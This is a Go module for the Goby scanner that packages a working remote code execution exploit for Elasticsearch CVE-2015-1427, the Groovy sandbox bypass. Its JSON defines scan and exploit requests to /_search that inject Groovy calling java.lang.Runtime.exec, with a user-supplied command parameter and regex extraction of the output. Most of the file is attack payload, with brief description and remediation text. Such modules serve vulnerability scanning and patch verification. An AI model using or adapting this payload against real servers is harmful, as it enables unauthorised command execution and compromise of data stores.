package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Elasticsearch Remote Code Execution CVE-2015-1427",
  "Description": "The Groovy script engine before Elasticsearch 1.3.8 and the Groovy script engine in 1.4.x before 1.4.3 allow remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands through elaborate scripts.",
  "Product": "Elasticsearch",
  "Homepage": "https://www.elastic.co/cn/elasticsearch/",
  "DisclosureDate": "2021-04-11",
  "Author": "zhzyker",
  "GobyQuery": "product=elasticsearch",
  "Level": "3",
  "Impact": "<p>In 2014, a remote code execution vulnerability (CVE-2014-3120) was exposed. The vulnerability appeared in the script query module. Since search engines support the use of script code (MVEL) as an expression for data manipulation, attackers can use MVEL Construct and execute arbitrary java code,</p><p>Later, the scripting language engine was changed to Groovy and a sandbox was added to control it. Dangerous codes would be intercepted. As a result, this time because the sandbox restrictions were not strict, it led to remote code execution.</p>",
  "Recommandation": "<p>Close the groovy sandbox to stop the use of dynamic scripts:<br></p><pre><code>script.groovy.sandbox.enabled: false<br></code></pre>",
  "References": [
    "https://github.com/zhzyker"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/website/blog/",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{ \"name\": \"cve-2015-1427\" }"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "201",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/_search?pretty",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/text"
        },
        "data_type": "text",
        "data": "{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo 460f7ccb583e25e09c0fe100a2c9e90d\\\").getText()\"}}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "460f7ccb583e25e09c0fe100a2c9e90d",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/website/blog/",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{ \"name\": \"cve-2015-1427\" }"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "201",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody"
      ]
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/_search?pretty",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/text"
        },
        "data_type": "text",
        "data": "{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"{{{cmd}}}\\\").getText()\"}}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "460f7ccb583e25e09c0fe100a2c9e90d",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody|regex|(?s)\"lupin\" : \\[ \"(.*)\" \\]"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}